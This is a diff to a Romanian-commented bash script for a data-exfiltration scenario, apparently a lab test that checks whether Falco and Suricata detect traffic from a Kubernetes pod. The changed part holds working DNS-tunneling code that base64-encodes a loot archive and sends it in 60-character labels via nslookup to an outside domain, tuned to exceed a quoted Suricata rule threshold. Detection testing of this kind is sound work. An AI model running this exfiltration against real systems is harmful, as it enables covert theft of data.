@@ -1,7 +1,7 @@
 #!/bin/bash
 # Scenariul 7 - Data Exfiltration (T1048 / T1560 / T1071.004)
 # Stage -> exfil prin curl (HTTPS), wget (HTTP), nc (raw TCP), DNS tunneling.
-# Spre deosebire de scenariul 3, traficul iese spre internet -> cross-tool real (Falco + Suricata).
+# Spre deosebire de scenariul 3, traficul iese spre internet -> cross-tool (Falco + Suricata).
 # Prerequisite: pod-ul are curl, wget, dnsutils instalate (apt-get install -y curl wget dnsutils).
 
 set -e
@@ -68,15 +68,17 @@ sleep 1
 # ---------------------------------------------------------------------------
 # step 5/5 - DNS exfiltration: loot encodat in label-uri DNS spre rezolver public (T1071.004)
 # ---------------------------------------------------------------------------
-echo "[step 5/5] DNS tunneling: base64(loot) -> chunks de 30 chars -> nslookup .$DNS_DOMAIN @$DNS_RESOLVER"
+echo "[step 5/5] DNS tunneling: base64(loot) -> chunks de 60 chars (>= pragul de 50 al regulii Suricata sid 1000012) -> nslookup .$DNS_DOMAIN @$DNS_RESOLVER"
+# Label-uri de 60 caractere: peste pragul regulii NIDS sid 1000012 (pcre /^[^.]{50,}\./) si
+# realist pentru tool-urile de DNS tunneling (iodine/dnscat2 folosesc label-uri lungi, max 63).
 kubectl exec -n $NS $POD -- bash -c "
-  D=\$(base64 -w0 /tmp/loot.tar.gz | tr '+/=' 'abc' | head -c 120)
+  D=\$(base64 -w0 /tmp/loot.tar.gz | tr '+/=' 'abc' | head -c 480)
   i=0
-  for c in \$(echo \$D | fold -w30); do
+  for c in \$(echo \$D | fold -w60); do
     i=\$((i+1))
     nslookup -timeout=2 -type=A \$c.chunk\$i.$DNS_DOMAIN $DNS_RESOLVER 2>&1 | grep -E 'Server|NXDOMAIN|can.t find|name =' | head -1
   done
-  echo \"sent \$i DNS exfil queries\"
+  echo \"sent \$i DNS exfil queries (label 60 chars)\"
 "
 echo ""
 
